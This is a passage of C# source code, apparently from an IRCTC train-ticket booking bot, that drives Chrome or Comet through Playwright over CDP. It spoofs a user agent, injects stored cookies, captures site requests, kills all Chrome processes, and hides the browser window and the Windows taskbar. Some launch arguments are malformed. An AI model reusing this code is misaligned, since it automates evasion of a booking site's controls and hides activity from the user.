                    Console.WriteLine(
                        $"Unexpected page. Retry {attempt}/{maxRetry}");

                    Thread.Sleep(random.Next(5000, 10000));

                    continue;
                }

                BrowserLoded = true;

                return page;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Attempt {attempt} failed: {ex.Message}");
                try
                {
                    if (chromeProcess != null && !chromeProcess.HasExited)
                    {
                        chromeProcess.Kill();
                        chromeProcess.WaitForExit(5000);
                    }
                }
                catch (Exception ex1)
                {
                    Console.WriteLine(ex1.Message);
                }
                Thread.Sleep(random.Next(3000, 7000));
            }
        }

        BrowserLoded = false;

        throw new Exception(
            "Unable to start Chrome and connect after maximum retries.");
    }

    internal IPage StartChromeAndConnect_2(ref string userDataDir, string directlogin, string tktname , Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        Process process = null;
        for (int i = 1; i <= 3; i++)
        {
            try
            {
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                if (string.IsNullOrWhiteSpace(folderPath))
                {
                    throw new Exception("LocalAppData directory nahi mili.");
                }
                string text = Path.Combine(folderPath, tktname, "Temp", "2");
                text = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(text);
                if (!Directory.Exists(text))
                {
                    throw new Exception("Playwright TEMP directory create nahi hui:\r\n" + text);
                }
                Environment.SetEnvironmentVariable("TEMP", text, EnvironmentVariableTarget.Process);
                Environment.SetEnvironmentVariable("TMP", text, EnvironmentVariableTarget.Process);
                Environment.SetEnvironmentVariable("TEMP", text);
                Environment.SetEnvironmentVariable("TMP", text);
                string browserPath = GetBrowserPath(TargetBrowser.Chrome);
                if (string.IsNullOrWhiteSpace(browserPath) || !File.Exists(browserPath))
                {
                    throw new Exception("Chrome executable nahi mila:\r\n\r\n" + browserPath);
                }
                int freeTcpPort = GetFreeTcpPort();
                if (string.IsNullOrWhiteSpace(userDataDir))
                {
                    userDataDir = Path.Combine(folderPath, tktname, "IRCTCChromeProfile");
                    Directory.CreateDirectory(userDataDir);
                }
                else
                {
                    Directory.CreateDirectory(userDataDir);
                    try
                    {
                        KillOldBrowserByProfile(userDataDir, TargetBrowser.Chrome);
                    }
                    catch
                    {
                    }
                }
                try
                {
                    KillAllcHROMEProcesses();
                }
                catch
                {
                }
                DisableEdgePasswordManager(userDataDir);
                Thread.Sleep(1500);
                page = null;
                string arguments = "--remote-debugging-port=" + freeTcpPort + " --remote-debugging-address=127.0.0.1 --user-data-dir=\"" + userDataDir + "\" --no-first-run --no-default-browser-check --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --app=https://www.irctc.co.in/nget/train-search--disable-features=msEdgeSync --password-store=basic --window-position=" + rect.X + "," + rect.Y;
                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.FileName = browserPath;
                processStartInfo.Arguments = arguments;
                processStartInfo.UseShellExecute = false;
                processStartInfo.CreateNoWindow = false;
                processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
                process = Process.Start(processStartInfo);
                if (process == null)
                {
                    throw new Exception("Chrome process start nahi hua.");
                }
                bool flag = false;
                int num = 30;
                for (int j = 0; j < num; j++)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        Task task = tcpClient.ConnectAsync("127.0.0.1", freeTcpPort);
                        if (task.Wait(TimeSpan.FromSeconds(1.0)) && tcpClient.Connected)
                        {
                            flag = true;
                            break;
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep(500);
                }
                if (!flag)
                {
                    throw new Exception("Chrome CDP port available nahi hua.\r\n\r\nPort: " + freeTcpPort);
                }
                IPlaywright result = Playwright.CreateAsync().GetAwaiter().GetResult();
                if (result == null)
                {
                    throw new Exception("Playwright create nahi hua.");
                }
                IBrowser result2 = result.Chromium.ConnectOverCDPAsync("http://127.0.0.1:" + freeTcpPort, (BrowserTypeConnectOverCDPOptions)null).GetAwaiter().GetResult();
                if (result2 == null)
                {
                    throw new Exception("Chrome CDP se connect nahi hua.");
                }
                IBrowserContext val = null;
                if (result2.Contexts != null && result2.Contexts.Count > 0)
                {
                    val = result2.Contexts[0];
                }
                if (val == null)
                {
                    val = result2.NewContextAsync(new BrowserNewContextOptions
                    {
                        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
                    }).GetAwaiter().GetResult();
                }
                if (val == null)
                {
                    throw new Exception("Browser context nahi mila.");
                }
                if (val.Pages != null && val.Pages.Count > 0)
                {
                    page = val.Pages.FirstOrDefault();
                }
                if (page == null)
                {
                    page = val.NewPageAsync().GetAwaiter().GetResult();
                }
                if (page == null)
                {
                    throw new Exception("Playwright page create nahi hua.");
                }
                try
                {
                    IntPtr intPtr = EdgeTaskbarHider.FindChromeWindowByUserDataDir(userDataDir);
                    if (intPtr != IntPtr.Zero)
                    {
                        EdgeTaskbarHider.HideFromTaskbar(intPtr);
                    }
                }
                catch
                {
                }
                try
                {
                    ICDPSession result3 = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    if (result3 != null)
                    {
                        JsonElement? result4 = result3.SendAsync("Browser.getWindowForTarget", (Dictionary<string, object>)null).GetAwaiter().GetResult();
                        if (result4.HasValue)
                        {
                            JsonElement value2 = result4.Value;
                            string propertyName = "windowId";
                            int @int = value2.GetProperty(propertyName).GetInt32();
                            int num3 = random.Next(1, 20);
                            int width = rect.Width;
                            int num4 = rect.Height - num3;
                            int x = rect.X;
                            int y = rect.Y;
                            Dictionary<string, object> dictionary = new Dictionary<string, object>();
                            string key = "windowId";
                            dictionary.Add(key, @int);
                            string key2 = "bounds";
                            Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                            string key3 = "left";
                            dictionary2.Add(key3, x);
                            string key4 = "top";
                            dictionary2.Add(key4, y);
                            string key5 = "width";
                            dictionary2.Add(key5, width);
                            string key6 = "height";
                            dictionary2.Add(key6, num4);
                            string key7 = "windowState";
                            string value3 = "normal";
                            dictionary2.Add(key7, value3);
                            dictionary.Add(key2, dictionary2);
                            Dictionary<string, object> args = dictionary;
                            string method2 = "Browser.setWindowBounds";
                            result3.SendAsync(method2, args).GetAwaiter().GetResult();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Window bounds error: " + ex.ToString());
                }
                if (!string.Equals(directlogin, "True", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        LoadCookiesFromJsonToBrowserChrome(val);
                    }
                    catch (Exception ex2)
                    {
                        Console.WriteLine("Cookie load error: " + ex2.ToString());
                    }
                }
                try
                {
                    CaptureIRCTCRequests(page);
                }
                catch (Exception ex3)
                {
                    Console.WriteLine("Request capture error: " + ex3.ToString());
                }
                IResponse val2 = null;
                try
                {
                    val2 = page.GotoAsync("https://www.irctc.co.in/nget/train-search", new PageGotoOptions
                    {
                        WaitUntil = (WaitUntilState)1,
                        Timeout = 45000f
                    }).GetAwaiter().GetResult();
                }
                catch (PlaywrightException val3)
                {
                    PlaywrightException val4 = val3;
                    Console.WriteLine("IRCTC Goto warning: " + ((Exception)(object)val4).Message);
                }
                catch (TimeoutException ex4)
                {
                    Console.WriteLine("IRCTC navigation timeout: " + ex4.Message);
                }
                Thread.Sleep(random.Next(3000, 5000));
                if (val2 != null)
                {
                    try
                    {
                        Console.WriteLine("URL: " + val2.Url);
                        Console.WriteLine("Status: " + val2.Status);
                    }
                    catch
                    {
                    }
                }
                string text2 = "";
                try
                {
                    text2 = page.ContentAsync().GetAwaiter().GetResult();
                }
                catch (Exception ex5)
                {
                    Console.WriteLine("Page content error: " + ex5.Message);
                }
                string text3 = (text2 ?? "").ToLowerInvariant();
                if (text3.Contains("we are experiencing high load"))
                {
                    Console.WriteLine("IRCTC High Load. Retry " + i + "/" + 3);
                    try
                    {
                        if (process != null && !process.HasExited)
                        {
                            process.Kill();
                            process.WaitForExit(5000);
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep(random.Next(15000, 30000));
                    continue;
                }
                bool flag2 = text3.Contains("book train tickets online instantly on irctc");
                bool flag3 = false;
                if (flag2 || flag3)
                {
                    BrowserLoded = true;
                    return page;
                }
                Console.WriteLine("Unexpected IRCTC page. Retry " + i + "/" + 3);
                try
                {
                    if (process != null && !process.HasExited)
                    {
                        process.Kill();
                        process.WaitForExit(5000);
                    }
                }
                catch
                {
                }
                Thread.Sleep(random.Next(5000, 10000));
            }
            catch (Exception ex6)
            {
                Console.WriteLine("Attempt " + i + " failed:");
                Console.WriteLine(ex6.ToString());
                MessageBox.Show("Attempt " + i + " failed:\r\n\r\n" + ex6.Message, "Chrome / Playwright Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                try
                {
                    if (process != null && !process.HasExited)
                    {
                        process.Kill();
                        process.WaitForExit(5000);
                    }
                }
                catch (Exception ex7)
                {
                    Console.WriteLine("Chrome cleanup error: " + ex7.Message);
                }
                process = null;
                page = null;
                if (i < 3)
                {
                    Thread.Sleep(random.Next(3000, 7000));
                }
            }
        }
        BrowserLoded = false;
        throw new Exception("Unable to start Chrome and connect after maximum retries.");
    }
    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(
    string lpClassName,
    string lpWindowName);

    [DllImport("user32.dll")]
    private static extern bool ShowWindow1(
        IntPtr hWnd,
        int nCmdShow);

    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;
    internal IPage StartChromeAndConnect_new_1(ref string userDataDir, Rectangle rect, string tktname, ref IPage page)
    {
        Random random = new Random();
        Process process = null;
        IntPtr windowsTaskbar = IntPtr.Zero;
        for (int i = 1; i <= 3; i++)
        {
            try
            {
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                if (string.IsNullOrWhiteSpace(folderPath))
                {
                    throw new Exception("LocalAppData directory nahi mili.");
                }
                string text = Path.Combine(folderPath, tktname, "Temp", "2");
                text = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(text);
                if (!Directory.Exists(text))
                {
                    throw new Exception("Playwright TEMP directory create nahi hui:\r\n" + text);
                }
                Environment.SetEnvironmentVariable("TEMP", text, EnvironmentVariableTarget.Process);
                Environment.SetEnvironmentVariable("TMP", text, EnvironmentVariableTarget.Process);
                Environment.SetEnvironmentVariable("TEMP", text);
                Environment.SetEnvironmentVariable("TMP", text);
                string browserPath = GetBrowserPath(TargetBrowser.Chrome);
                if (string.IsNullOrWhiteSpace(browserPath) || !File.Exists(browserPath))
                {
                    throw new Exception("Chrome executable nahi mila:\r\n\r\n" + browserPath);
                }
                int freeTcpPort = GetFreeTcpPort();
                if (string.IsNullOrWhiteSpace(userDataDir))
                {
                    userDataDir = Path.Combine(folderPath, tktname, "IRCTCChromeProfile");
                    Directory.CreateDirectory(userDataDir);
                }
                else
                {
                    Directory.CreateDirectory(userDataDir);
                    try
                    {
                        KillOldBrowserByProfile(userDataDir, TargetBrowser.Chrome);
                    }
                    catch
                    {
                    }
                }
                try
                {
                    KillAllcHROMEProcesses();
                }
                catch
                {
                }
                DisableEdgePasswordManager(userDataDir);
                Thread.Sleep(1500);
                page = null;
                // =====================================================
                // WINDOWS TASKBAR HIDE BEFORE EDGE LAUNCH
                // =====================================================

                windowsTaskbar =
                    FindWindow(
                        "Shell_TrayWnd",
                        null);

                if (windowsTaskbar != IntPtr.Zero)
                {
                    ShowWindow(
                        windowsTaskbar,
                        SW_HIDE);
                }
                string arguments = "--remote-debugging-port=" + freeTcpPort + " --remote-debugging-address=127.0.0.1 --user-data-dir=\"" + userDataDir + "\" --no-first-run --no-default-browser-check --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --https://www.irctc.co.in/nget/train-search--disable-features=msEdgeSync --password-store=basic --window-position=" + rect.X + "," + rect.Y + 1200;
                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.FileName = browserPath;
                processStartInfo.Arguments = arguments;
                processStartInfo.UseShellExecute = false;
                processStartInfo.CreateNoWindow = false;
                processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
                process = Process.Start(processStartInfo);
                if (process == null)
                {
                    throw new Exception("Chrome process start nahi hua.");
                }
                bool flag = false;
                int num = 30;
                for (int j = 0; j < num; j++)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        Task task = tcpClient.ConnectAsync("127.0.0.1", freeTcpPort);
                        if (task.Wait(TimeSpan.FromSeconds(1.0)) && tcpClient.Connected)
                        {
                            flag = true;
                            break;
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep(500);
                }
                if (!flag)
                {
                    throw new Exception("Chrome CDP port available nahi hua.\r\n\r\nPort: " + freeTcpPort);
                }
                IPlaywright result = Playwright.CreateAsync().GetAwaiter().GetResult();
                if (result == null)
                {
                    throw new Exception("Playwright create nahi hua.");
                }
                IBrowser result2 = result.Chromium.ConnectOverCDPAsync("http://127.0.0.1:" + freeTcpPort, (BrowserTypeConnectOverCDPOptions)null).GetAwaiter().GetResult();
                if (result2 == null)
                {
                    throw new Exception("Chrome CDP se connect nahi hua.");
                }
                IBrowserContext val = null;
                if (result2.Contexts != null && result2.Contexts.Count > 0)
                {
                    val = result2.Contexts[0];
                }
                if (val == null)
                {
                    val = result2.NewContextAsync(new BrowserNewContextOptions
                    {
                        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
                    }).GetAwaiter().GetResult();
                }
                if (val == null)
                {
                    throw new Exception("Browser context nahi mila.");
                }
                if (val.Pages != null && val.Pages.Count > 0)
                {
                    page = val.Pages.FirstOrDefault();
                }
                if (page == null)
                {
                    page = val.NewPageAsync().GetAwaiter().GetResult();
                }
                if (page == null)
                {
                    throw new Exception("Playwright page create nahi hua.");
                }
                try
                {
                    IntPtr intPtr = EdgeTaskbarHider.FindChromeWindowByUserDataDir(userDataDir);
                    if (intPtr != IntPtr.Zero)
                    {
                        EdgeTaskbarHider.HideFromTaskbar(intPtr);
                    }
                }
                catch
                {
                }
                try
                {
                    ICDPSession result3 = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    if (result3 != null)
                    {
                        JsonElement? result4 = result3.SendAsync("Browser.getWindowForTarget", (Dictionary<string, object>)null).GetAwaiter().GetResult();
                        if (result4.HasValue)
                        {
                            JsonElement value2 = result4.Value;
                            string propertyName = "windowId";
                            int @int = value2.GetProperty(propertyName).GetInt32();
                            int num3 = random.Next(1, 20);
                            int width = rect.Width;
                            int num4 = rect.Height - num3;
                            int x = rect.X;
                            int y = rect.Y;
                            Dictionary<string, object> dictionary = new Dictionary<string, object>();
                            string key = "windowId";
                            dictionary.Add(key, @int);
                            string key2 = "bounds";
                            Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                            string key3 = "left";
                            dictionary2.Add(key3, x);
                            string key4 = "top";
                            dictionary2.Add(key4, y + random.Next(1200, 1600));
                            string key5 = "width";
                            dictionary2.Add(key5, width);
                            string key6 = "height";
                            dictionary2.Add(key6, num4);
                            string key7 = "windowState";
                            string value3 = "normal";
                            dictionary2.Add(key7, value3);
                            dictionary.Add(key2, dictionary2);
                            Dictionary<string, object> args = dictionary;
                            string method2 = "Browser.setWindowBounds";
                            result3.SendAsync(method2, args).GetAwaiter().GetResult();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Window bounds error: " + ex.ToString());
                }
                    try
                    {
                        LoadCookiesFromJsonToBrowserChrome(val);
                    }
                    catch (Exception ex2)
                    {
                        Console.WriteLine("Cookie load error: " + ex2.ToString());
                    }
                try
                {
                    CaptureIRCTCRequests(page);
                }
                catch (Exception ex3)
                {
                    Console.WriteLine("Request capture error: " + ex3.ToString());
                }
                IResponse val2 = null;
                try
                {
                    val2 = page.GotoAsync("https://www.irctc.co.in/nget/train-search", new PageGotoOptions
                    {
                        WaitUntil = (WaitUntilState)1,
                        Timeout = 45000f
                    }).GetAwaiter().GetResult();
                }
                catch (PlaywrightException val3)
                {
                    PlaywrightException val4 = val3;
                    Console.WriteLine("IRCTC Goto warning: " + ((Exception)(object)val4).Message);
                }
                catch (TimeoutException ex4)
                {
                    Console.WriteLine("IRCTC navigation timeout: " + ex4.Message);
                }
                Thread.Sleep(random.Next(3000, 5000));
                if (val2 != null)
                {
                    try
                    {
                        Console.WriteLine("URL: " + val2.Url);
                        Console.WriteLine("Status: " + val2.Status);
                    }
                    catch
                    {
                    }
                }
                string text2 = "";
                try
                {
                    text2 = page.ContentAsync().GetAwaiter().GetResult();
                }
                catch (Exception ex5)
                {
                    Console.WriteLine("Page content error: " + ex5.Message);
                }
                string text3 = (text2 ?? "").ToLowerInvariant();
                if (text3.Contains("we are experiencing high load"))
                {
                    Console.WriteLine("IRCTC High Load. Retry " + i + "/" + 3);
                    try
                    {
                        if (process != null && !process.HasExited)
                        {
                            process.Kill();
                            process.WaitForExit(5000);
                        }
                    }
                    catch
                    {
                    }
                    Thread.Sleep(random.Next(15000, 30000));
                    continue;
                }
                bool flag2 = text3.Contains("book train tickets online instantly on irctc");
                bool flag3 = false;
                if (flag2 || flag3)
                {
                    try
                    {
                        if (windowsTaskbar != IntPtr.Zero)
                        {
                            ShowWindow(
                                windowsTaskbar,
                                SW_SHOW);
                        }
                    }
                    catch
                    {
                    }
                    windowsTaskbar =
                        IntPtr.Zero;
                    BrowserLoded = true;
                    return page;
                }
                Console.WriteLine("Unexpected IRCTC page. Retry " + i + "/" + 3);
                try
                {
                    if (process != null && !process.HasExited)
                    {
                        process.Kill();
                        process.WaitForExit(5000);
                    }
                }
                catch
                {
                }
                Thread.Sleep(random.Next(5000, 10000));
            }
            catch (Exception ex6)
            {
                Console.WriteLine("Attempt " + i + " failed:");
                Console.WriteLine(ex6.ToString());
                MessageBox.Show("Attempt " + i + " failed:\r\n\r\n" + ex6.Message, "Chrome / Playwright Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                try
                {
                    if (process != null && !process.HasExited)
                    {
                        process.Kill();
                        process.WaitForExit(5000);
                    }
                }
                catch (Exception ex7)
                {
                    Console.WriteLine("Chrome cleanup error: " + ex7.Message);
                }
                process = null;
                page = null;
                if (i < 3)
                {
                    Thread.Sleep(random.Next(3000, 7000));
                }
            }
        }
        BrowserLoded = false;
        throw new Exception("Unable to start Chrome and connect after maximum retries.");
    }

    internal IPage StartChromeAndConnect_Beta(ref string userDataDir, string directlogin, Rectangle rect, ref IPage page)
    {
        const int maxRetry = 3;
        Random random = new Random();
        int num = 0;
        Process process = null;
        for (int attempt = 1; attempt <= maxRetry; attempt++)
        {
            Process chromeProcess = null;
            try
            {
                string chromePath = GetBrowserPath(TargetBrowser.Chrome);
                int debugPort = GetFreeTcpPort();
                if (string.IsNullOrWhiteSpace(userDataDir))
                {
                    userDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IRCTCChromeProfile");
                    Directory.CreateDirectory(userDataDir);
                }
                else
                {
                    KillOldBrowserByProfile(userDataDir, TargetBrowser.Chrome);
                }
                KillAllcHROMEProcesses();
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string edgePath = GetEdgePath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, debugPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir;
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --app=https://www.irctc.co.in/nget/train-search";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + chromePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = chromePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                bool connected = false;
                for (int i = 0; i < 10; i++)
                {
                    try
                    {
                        using TcpClient client = new TcpClient();

                        client.Connect("127.0.0.1", debugPort);

                        connected = true;
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                    }
                }

                if (!connected)
                    throw new Exception("Chrome CDP port not available.");

                var playwright = Playwright.CreateAsync().GetAwaiter().GetResult();
                var browser = playwright.Chromium.ConnectOverCDPAsync($"http://127.0.0.1:{debugPort}").GetAwaiter().GetResult();
                IBrowserContext context;
                if (browser.Contexts.Any())
                {
                    context = browser.Contexts[0];
                }
                else
                {
                    context = browser
                        .NewContextAsync(new BrowserNewContextOptions
                        {
                            UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
                                "AppleWebKit/537.36 (KHTML, like Gecko) " +
                                "Chrome/137.0.0.0 Safari/537.36"
                        })
                        .GetAwaiter()
                        .GetResult();
                }
                page = context.Pages.FirstOrDefault();
                if (page == null)
                {
                    page = context.NewPageAsync()
                        .GetAwaiter()
                        .GetResult();
                }
                IntPtr hwnd = EdgeTaskbarHider.FindChromeWindowByUserDataDir(userDataDir);
                if (hwnd != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(hwnd);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                if (directlogin != "True")
                {
                    LoadCookiesFromJsonToBrowserChrome(context);
                }
                CaptureIRCTCRequests(page);

                Thread.Sleep(random.Next(2000, 4000));

                var responsePage = page.GotoAsync(
                    "https://www.irctc.co.in/eticket/train-search",
                    new PageGotoOptions
                    {
                        WaitUntil = WaitUntilState.Load,
                        Timeout = 120000
                    })
                    .GetAwaiter()
                    .GetResult();

                Thread.Sleep(random.Next(3000, 6000));

                if (responsePage != null)
                {
                    Console.WriteLine(
                        $"URL: {responsePage.Url}");

                    Console.WriteLine(
                        $"Status: {responsePage.Status}");
                }

                string html = page.ContentAsync().GetAwaiter().GetResult();

                string htmlLower = html.ToLowerInvariant();

                if (htmlLower.Contains(
                        "we are experiencing high load"))
                {
                    Console.WriteLine(
                        $"IRCTC High Load. Retry {attempt}/{maxRetry}");

                    Thread.Sleep(random.Next(15000, 30000));

                    continue;
                }

                if (!htmlLower.Contains(
                        "book train tickets online instantly on irctc"))
                {
                    Console.WriteLine(
                        $"Unexpected page. Retry {attempt}/{maxRetry}");

                    Thread.Sleep(random.Next(5000, 10000));

                    continue;
                }

                BrowserLoded = true;

                return page;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Attempt {attempt} failed: {ex.Message}");
                try
                {
                    if (chromeProcess != null && !chromeProcess.HasExited)
                    {
                        chromeProcess.Kill();
                        chromeProcess.WaitForExit(5000);
                    }
                }
                catch (Exception ex1)
                {
                    Console.WriteLine(ex1.Message);
                }
                Thread.Sleep(random.Next(3000, 7000));
            }
        }

        BrowserLoded = false;

        throw new Exception(
            "Unable to start Chrome and connect after maximum retries.");
    }
    internal IPage StartCometAndConnect(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldCometByProfile(userDataDir00);
                }
                else
                {
                    userDataDir00 = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }

                    Console.WriteLine("Comet will use profile path: " + userDataDir00);
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string cometPath = GetCometPath();
                if (string.IsNullOrEmpty(cometPath))
                {
                    MessageBox.Show("Install Comet Browser First For Booking with Comet Browser");
                    BrowserLoded = false;
                    return null;
                }
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --app=https://www.irctc.co.in/nget/assets/images/logo.png";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + cometPath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = cometPath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Edge port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Edge Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort)).GetAwaiter().GetResult().Contexts[0];
                if (browserContext.Pages.Count <= 0)
                {
                    page = browserContext.NewPageAsync().GetAwaiter().GetResult();
                }
                else
                {
                    page = browserContext.Pages[0];
                }
                IntPtr intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequests(page);
                if (directlogin != "True")
                {
                    LoadCookiesFromJsonToBrowserComet(browserContext);
                }
                IPage page2 = page;
                string url = "https://www.irctc.co.in/nget/train-search";
                page2.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                BrowserLoded = true;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
            }
            break;
        }
        return page;
    }

    internal IPage StartCometAndConnect_Beta(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            try
            {
